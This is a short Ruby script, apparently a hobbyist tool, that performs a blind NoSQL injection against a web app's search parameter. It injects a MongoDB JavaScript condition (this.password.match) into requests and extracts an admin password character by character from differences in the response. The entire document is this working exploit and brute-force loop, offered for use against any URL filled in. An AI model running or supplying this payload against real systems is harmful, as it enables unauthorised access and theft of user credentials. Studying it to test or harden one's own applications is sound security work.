# v0idsec

# Super simple webapp password cracker 
# designed to perform a blind NoSQL injection attack, which targets NoSQL databases like MongoDB.

require 'httparty'

URL = "ENTER URL"

def check?(str)
  resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
  return resp.body =~ />admin</
end

# def check?

CHARSET = ('a'..'z').to_a + ('0'..'9').to_a + ['-']
password = ""

while true
  CHARSET.each do |c|
    puts "trying: #{c} for #{password}"
    test = password + c
    if check?("^#{test}.*$")
      password += c
      puts password
      break
    end
  end
end
